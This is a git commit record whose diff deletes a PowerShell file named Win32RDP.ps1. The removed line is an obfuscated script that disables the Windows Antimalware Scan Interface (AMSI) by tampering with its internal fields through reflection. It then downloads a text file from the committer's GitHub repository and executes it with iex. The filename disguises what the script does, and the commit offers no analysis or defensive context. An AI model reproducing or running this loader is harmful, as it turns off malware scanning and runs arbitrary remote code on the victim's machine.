7890e8a5aec8bf43204a7e7e52a1160cf960c2ea
Upload96 <76906376+Upload96@users.noreply.github.com>
2021-01-05 18:33:36 +1000

    Delete Win32RDP.ps1

--- Win32RDP.ps1
+++
@@ -1,3 +0,0 @@
-
-$PDIHS=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076));[Ref].Assembly.GetType("System.Management.Automation.$([SYSTem.neT.WEBUtilitY]::hTmlDecodE('&#65;&#109;&#115;&#105;'))Utils").GetField("$([CHaR](105-8)+[CHAR](109)+[ChAr](10+105)+[chAR]([BYte]0x69))Session", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.$([SYSTem.neT.WEBUtilitY]::hTmlDecodE('&#65;&#109;&#115;&#105;'))Utils").GetField("$([CHaR](105-8)+[CHAR](109)+[ChAr](10+105)+[chAR]([BYte]0x69))Context", "NonPublic,Static").SetValue($null, [IntPtr]$PDIHS);$web = New-Object System.Net.WebClient;$string = $web.Downloadstring('https://raw.githubusercontent.com/Upload96/UploadDownload/main/TCP.txt');iex $string
-
